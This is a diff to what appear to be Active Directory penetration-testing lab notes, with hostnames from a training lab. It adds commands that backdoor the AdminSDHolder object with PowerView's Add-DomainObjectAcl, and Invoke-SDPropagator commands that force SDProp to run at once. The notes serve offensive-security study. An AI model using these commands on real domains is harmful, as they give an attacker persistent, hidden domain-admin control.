@@ -118,6 +118,8 @@ ls \\dcorp-dc\C$
 
 - With DA privileges (Full Control/Write permissions) on the AdminSDHolder object, it can be used as a backdoor/persistence mechanism by adding a user with Full Permissions (or other interesting permissions) to the AdminSDHolder object.
 - In 60 minutes (when SDPROP runs), the user will be added with Full Control to the AC of groups like Domain Admins without actually being a member of it.
+
+#### Attack
 - Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA:
 ```powershell
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-
@@ -148,6 +150,18 @@ Add-DomainObjectAcl -TargetIdentity
 -PrincipalDomain dollarcorp.moneycorp.local 
 -TargetDomain dollarcorp.moneycorp.local -Verbose
 ```
+
+__SDProp Manually__
+- Invoke-SDPropagator.ps1 
+```powershell
+Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
+```
+- For pre-Server 2008 machines:
+```powershell
+Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 
+-showProgress -Verbose
+```
+
 
 ---
 
